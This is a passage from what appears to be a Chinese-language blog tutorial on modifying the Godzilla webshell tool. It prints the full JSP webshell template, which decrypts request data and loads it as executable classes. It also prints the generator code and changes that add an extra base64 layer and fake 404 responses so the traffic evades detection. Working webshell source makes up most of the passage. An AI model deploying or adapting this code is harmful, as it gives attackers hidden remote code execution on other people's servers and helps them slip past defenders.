<li>服务端响应的base64多加密一次，客户端接收的时候解密decode也需要多解密一次。</li>
</ul>
<p><strong>所以服务端解密是依据客户端加密，客户端解密依据于服务端响应加密</strong> </p>
<h4 id="shell-jsp"><a href="#shell-jsp" class="headerlink" title="shell.jsp"></a>shell.jsp</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160725719.png"
                      class="" title="image-20250317160725719"
                > 

<p>shell.jsp非常简单，两个变量，是不是可以感觉名字有点像，base64Code.bin、base64GlobalCode.bin这两个，如果我们用的是base64的加密方式那是不是就感觉他们把两个文件跟上面两个参数替换了一下</p>
<h4 id="base64GlobalCode-bin"><a href="#base64GlobalCode-bin" class="headerlink" title="base64GlobalCode.bin"></a>base64GlobalCode.bin</h4><p>这里的bin文件我丢给gpt格式化了一下，好看一点</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">// 定义加密密钥和传递参数</span><br><span class="line">String xc = &quot;&#123;secretKey&#125;&quot;;</span><br><span class="line">String pass = &quot;&#123;pass&#125;&quot;;</span><br><span class="line">String md5 = md5(pass + xc);</span><br><span class="line"></span><br><span class="line">// 自定义类加载器，用于动态加载字节码</span><br><span class="line">class X extends ClassLoader &#123;</span><br><span class="line">    public X(ClassLoader z) &#123;</span><br><span class="line">        super(z);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义方法，用于将字节数组转换为Class对象</span><br><span class="line">    public Class&lt;?&gt; Q(byte[] cb) &#123;</span><br><span class="line">        return super.defineClass(cb, 0, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// AES 加密/解密方法</span><br><span class="line">public byte[] x(byte[] s, boolean m) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 获取AES加密实例</span><br><span class="line">        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        // 初始化加密或解密模式</span><br><span class="line">        c.init(m ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE,</span><br><span class="line">               new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));</span><br><span class="line">        // 执行加密或解密操作</span><br><span class="line">        return c.doFinal(s);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// MD5 哈希方法</span><br><span class="line">public static String md5(String s) &#123;</span><br><span class="line">    String ret = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 获取MD5实例</span><br><span class="line">        java.security.MessageDigest m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">        // 更新哈希值</span><br><span class="line">        m.update(s.getBytes(), 0, s.length());</span><br><span class="line">        // 转换为16进制字符串并大写</span><br><span class="line">        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base64 编码方法</span><br><span class="line">public static String base64Encode(byte[] bs) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; base64;</span><br><span class="line">    String value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 尝试使用 java.util.Base64</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (String) encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[]&#123;byte[].class&#125;)</span><br><span class="line">                                  .invoke(encoder, new Object[]&#123;bs&#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 如果 java.util.Base64 不可用，尝试使用 sun.misc.BASE64Encoder</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">            Object encoder = base64.newInstance();</span><br><span class="line">            value = (String) encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;)</span><br><span class="line">                                    .invoke(encoder, new Object[]&#123;bs&#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base64 解码方法</span><br><span class="line">public static byte[] base64Decode(String bs) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; base64;</span><br><span class="line">    byte[] value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 尝试使用 java.util.Base64</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                .invoke(decoder, new Object[]&#123;bs&#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 如果 java.util.Base64 不可用，尝试使用 sun.misc.BASE64Decoder</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            Object decoder = base64.newInstance();</span><br><span class="line">            value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                    .invoke(decoder, new Object[]&#123;bs&#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>了解代码除了定义 </p>
<p><strong>String xc &#x3D; “{secretKey}”;<br>String pass &#x3D; “{pass}”;<br>String md5 &#x3D; md5(pass + xc);</strong> </p>
<p>其余都是函数，所以可以理解上半部分的<strong>xxxGlobalCode.bin</strong> 就是用来写需要用到的函数调用的</p>
<h4 id="base64Code-bin"><a href="#base64Code-bin" class="headerlink" title="base64Code.bin"></a>base64Code.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class&lt;?&gt;) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法（可能用于触发某些逻辑）</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        response.getWriter().write(md5.substring(0, 16));</span><br><span class="line"></span><br><span class="line">        // 调用toString方法（可能用于触发某些逻辑）</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        response.getWriter().write(md5.substring(16));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看出来是我们jsp运行时候的代码，它会接受请求的参数，并且调用相关加解密，最后返回给前端</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161635258.png"
                      class="" title="image-20250317161635258"
                > 

<h3 id="多加一次base64加密"><a href="#多加一次base64加密" class="headerlink" title="多加一次base64加密"></a>多加一次base64加密</h3><p>请求包的时候多加一次base64</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162234205.png"
                      class="" title="image-20250317162234205"
                > 

<p>根据前面学习的经验，修改的代码要在src目录下然后对应之前的目录，需要在shells.cryptions.目录下，然后我们新建一个JavaAesBase64_2目录，先写generate生成shell的代码</p>
<h4 id="Generate-java"><a href="#Generate-java" class="headerlink" title="Generate.java"></a>Generate.java</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">package shells.cryptions.JavaAesBase64_2;</span><br><span class="line"></span><br><span class="line">import core.ApplicationContext;</span><br><span class="line">import core.ui.component.dialog.GOptionPane;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import util.Log;</span><br><span class="line">import util.functions;</span><br><span class="line"></span><br><span class="line">class Generate &#123;</span><br><span class="line">    private static final String[] SUFFIX = new String[]&#123;&quot;jsp&quot;, &quot;jspx&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    Generate() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) &#123;</span><br><span class="line">        byte[] data = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            InputStream inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/&quot; + shellName + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;GlobalCode.bin&quot;);</span><br><span class="line">            String globalCode = new String(functions.readInputStream(inputStream));</span><br><span class="line">            inputStream.close();</span><br><span class="line">            globalCode = globalCode.replace(&quot;&#123;pass&#125;&quot;, pass).replace(&quot;&#123;secretKey&#125;&quot;, secretKey);</span><br><span class="line">            inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/&quot; + shellName + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;Code.bin&quot;);</span><br><span class="line">            String code = new String(functions.readInputStream(inputStream));</span><br><span class="line">            inputStream.close();</span><br><span class="line">            Object selectedValue = GOptionPane.showInputDialog(null, &quot;suffix&quot;, &quot;selected suffix&quot;, 1, null, SUFFIX, null);</span><br><span class="line">            if (selectedValue != null) &#123;</span><br><span class="line">                String suffix = (String)selectedValue;</span><br><span class="line">                inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/shell.&quot; + suffix);</span><br><span class="line">                String template = new String(functions.readInputStream(inputStream));</span><br><span class="line">                inputStream.close();</span><br><span class="line">                if (suffix.equals(SUFFIX[1])) &#123;</span><br><span class="line">                    globalCode = globalCode.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">                    code = code.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                template = ApplicationContext.isGodMode() ? template.replace(&quot;&#123;globalCode&#125;&quot;, functions.stringToUnicode(globalCode)).replace(&quot;&#123;code&#125;&quot;, functions.stringToUnicode(code)) : template.replace(&quot;&#123;globalCode&#125;&quot;, globalCode).replace(&quot;&#123;code&#125;&quot;, code);</span><br><span class="line">                data = template.getBytes();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.error(e);</span><br><span class="line">        &#125;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) &#123;</span><br><span class="line">        return shells.cryptions.JavaAesBase64_2.Generate.GenerateShellLoder(&quot;&quot;, pass, secretKey, isBin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里其实就是遍历template下的模版然后组合起来而已，要修改的地方就是目录结构下我们调用的函数因为目录名字变了需要改一下</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162430268.png"
                      class="" title="image-20250317162430268"
                > 

<h4 id="JavaAesBase64-2-java"><a href="#JavaAesBase64-2-java" class="headerlink" title="JavaAesBase64_2.java"></a>JavaAesBase64_2.java</h4><p>添加加密方式修改这里</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163409108.png"
                      class="" title="image-20250317163409108"
                > 

<p>就会多一种加密方式</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163422068.png"
                      class="" title="image-20250317163422068"
                > 

<p>这里不贴完整代码了，太长了，就多加一个base64的客户端加密，直接贴图</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public byte[] encode(byte[] data) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] encoded_Aes = this.encodeCipher.doFinal(data);</span><br><span class="line">            byte[] encoded_Base64_1 = functions.base64Encode(encoded_Aes);</span><br><span class="line">            return (this.pass + &quot;=&quot; + URLEncoder.encode(functions.base64EncodeToString(encoded_Base64_1))).getBytes();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.error(e);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>根据原本的decode解密可以知道，decode的步骤是base64解密，再AES解密。所以我们修改的时候要把AES加密放在最前面，然后我们多加一步base64Encode()</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162805975.png"
                      class="" title="image-20250317162805975"
                > 

<p><strong>此时还没完</strong>！！！，前面说了客户端加密决定服务端接收参数的时候解密。所以我们服务端webshell接收的参数肯定也要多一次base64decode的解密</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163025906.png"
                      class="" title="image-20250317163025906"
                > 

<p>这里就是多加了一次。</p>
<h4 id="template-base64Code-bin"><a href="#template-base64Code-bin" class="headerlink" title="template&#x2F;base64Code.bin"></a>template&#x2F;base64Code.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = base64Decode(new String(data));  // 将 byte[] 转换为 String</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法，可能用于触发某些逻辑</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        //response.getWriter().write(md5.substring(0, 16));</span><br><span class="line">        response.setStatus(404);</span><br><span class="line">        // 调用toString方法，可能用于触发某些逻辑</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        //response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        //response.getWriter().write(md5.substring(16));</span><br><span class="line">        response.getWriter().write(&quot;My only love:&quot;+base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="templates-base64GlobalCode-bin"><a href="#templates-base64GlobalCode-bin" class="headerlink" title="templates&#x2F;base64GlobalCode.bin"></a>templates&#x2F;base64GlobalCode.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="template-shell-jsp"><a href="#template-shell-jsp" class="headerlink" title="template&#x2F;shell.jsp"></a>template&#x2F;shell.jsp</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!&#123;globalCode&#125;%&gt;&lt;%&#123;code&#125;%&gt;</span><br></pre></td></tr></table></figure></div>

<p>然后编译运行，看看能否连接。因为客户端与服务端加解密如果之前有差错是不能进行连接的。会出现连接失败的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163307114.png"
                      class="" title="image-20250317163307114"
                > 

<p>生成一个默认的木马放到tomcat的服务器下</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163457842.png"
                      class="" title="image-20250317163457842"
                > 

<p>我们设置了走burpsuite的代理。可以看看流量</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163536726.png"
                      class="" title="image-20250317163536726"
                > 

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MG1RVStTMXBGblR6M3R0VlRuQWdKVkQvYUJ3RDNOTlhMM1RmVEV4bzF3ZUt1NEtBaGhDdTZHbjFFUWZYMW05Zw%3D%3D </span><br></pre></td></tr></table></figure></div>

<p>这里是我们的参数，经过AES加密，然后两次base64然后url编码。AES是二进制的流量，所以如果我们base64解码之后是乱码就可以知道我们加密成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163729074.png"
                      class="" title="image-20250317163729074"
                > 

<h2 id="修改响应包的流量（404-响应参数初步修改）"><a href="#修改响应包的流量（404-响应参数初步修改）" class="headerlink" title="修改响应包的流量（404+响应参数初步修改）"></a>修改响应包的流量（404+响应参数初步修改）</h2><h3 id="404"><a href="#404" class="headerlink" title="404"></a>404</h3><p>我们现在的响应包是200状态码，我们可以尝试看看能不能让他为404</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163954583.png"
                      class="" title="image-20250317163954583"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164051025.png"
                      class="" title="image-20250317164051025"
                > 

<p>分析我们之前生成的代码这里是设置响应包的，响应包的参数前面是16位md5+加base64后的数据+16位md5</p>
<p>我们尝试添加状态码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setStatus(404);</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164354248.png"
                      class="" title="image-20250317164354248"
                > 

<p>观察burpSuite的流量</p>
<img  
                     lazyload
